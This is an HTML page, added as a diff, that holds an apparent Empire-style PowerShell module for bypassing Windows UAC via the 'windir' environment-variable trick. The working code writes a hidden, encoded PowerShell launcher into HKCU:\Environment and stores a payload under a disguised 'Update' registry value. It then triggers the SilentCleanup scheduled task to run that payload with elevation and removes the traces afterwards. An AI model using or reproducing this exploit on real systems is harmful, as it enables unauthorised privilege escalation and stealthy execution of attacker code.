@@ -1,0 +1,59 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Env</title>
+</head><body>&quot;Bypasses UAC (even with Always Notify level set) by by performing an registry modification&quot;<br/>
+              &quot; of the \&quot;windir\&quot; value in \&quot;Environment\&quot; based on James Forshaw findings&quot;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">  &quot;(https://tyranidslair.blogspot.cz/2017/05/exploiting-environment-variables-in.html)&quot;)</li>
+<li style="list-style-type: none"/>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Does not need Admin<br/>
+https://tyranidslair.blogspot.cz/2017/05/exploiting-environment-variables-in.html<br/>
+<br/>
+moduleSource = self.mainMenu.installPath + &quot;/data/module_source/privesc/Invoke-EnvBypass.ps1<br/>
+<br/>
+<br/>
+$envCommandPath = &quot;HKCU:\Environment&quot;<br/>
+  $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1'<br/>
+<br/>
+  if ($Force -or ((Get-ItemProperty -Path $envCommandPath -Name 'windir' -ErrorAction SilentlyContinue) -eq $null)){<br/>
+    New-Item $envCommandPath -Force |<br/>
+      New-ItemProperty -Name 'windir' -Value $launcherCommand -PropertyType string -Force | Out-Null<br/>
+  }else{<br/>
+    Write-Warning &quot;Key already exists, consider using -Force&quot;<br/>
+    exit<br/>
+  }<br/>
+<br/>
+  if (Test-Path $envCommandPath) {<br/>
+    Write-Verbose &quot;Created registry entries to change windir&quot;<br/>
+  }else{<br/>
+    Write-Warning &quot;Failed to create registry key, exiting&quot;<br/>
+    exit<br/>
+  }<br/>
+<br/>
+  $schtasksPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'schtasks.exe'<br/>
+  if ($PSCmdlet.ShouldProcess($schtasksPath, 'Start process')) {<br/>
+    $Process = Start-Process -FilePath $schtasksPath -ArgumentList '/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I' -PassThru -WindowStyle Hidden<br/>
+    Write-Verbose &quot;Started schtasks.exe&quot;<br/>
+  }<br/>
+<br/>
+  #Sleep 5 seconds <br/>
+  Write-Verbose &quot;Sleeping 5 seconds to trigger payload&quot;<br/>
+  if (-not $PSBoundParameters['WhatIf']) {<br/>
+    Start-Sleep -Seconds 5<br/>
+  }<br/>
+<br/>
+  $envfilePath = &quot;HKCU:\Environment&quot;<br/>
+  $envfileKey = &quot;windir&quot;<br/>
+  $PayloadPath = 'HKCU:Software\Microsoft\Windows'<br/>
+  $PayloadKey = &quot;Update&quot;<br/>
+<br/>
+  if (Test-Path $envfilePath) {<br/>
+    #Remove the registry entry<br/>
+    Remove-ItemProperty -Force -Path $envfilePath -Name $envfileKey<br/>
+    Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey<br/>
+    Write-Verbose &quot;Removed registry entries&quot;<br/>
+}</body></html>
